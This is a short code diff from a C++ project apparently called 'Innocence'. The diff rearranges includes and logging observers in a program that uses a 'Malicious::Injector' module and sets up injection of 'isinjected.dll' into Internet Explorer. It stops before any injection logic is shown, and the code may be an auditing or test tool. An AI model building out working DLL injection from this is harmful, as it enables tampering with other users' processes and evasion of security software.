@@ -1,6 +1,7 @@
 //#define WINVER 0x0500
 //#define _WIN32_WINNT 0x0500
 //#define _WIN32_WINNT _WIN32_WINNT_WINXP
+#include <Innocence.hpp>
 
 #include <audit/Audit.hpp>
 
@@ -11,10 +12,12 @@ using namespace Common;
 #include <malicious/Injector.hpp>
 
 #include <system/Process.hpp>
-#include <Innocence.hpp>
 
 #include <network/Pipe.hpp>
 using namespace Network;
+
+#include <iostream>
+using namespace std;
 
 int main(int argc, char * argv[])
 //int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
@@ -22,10 +25,11 @@ int main(int argc, char * argv[])
 	int exitCode = EXIT_FAILURE;
 	try
 	{
-		LOG.setHeader(Innocence::INJECTION_AUDIT_HEADER);
+		LOG.setIdentity(Innocence::identity);
         LOG.addObserver(new Common::LogToCollector);
 		LOG.addObserver(new Common::LogToConsole);
-		
+		LOG.addObserver(new Audit::LogToAuditor);
+
 		System::Process::This thisProcess;		
         Malicious::InternetExplorer ie(false);
 		std::string dllPath = thisProcess.getProgramDir() + "\\isinjected.dll";
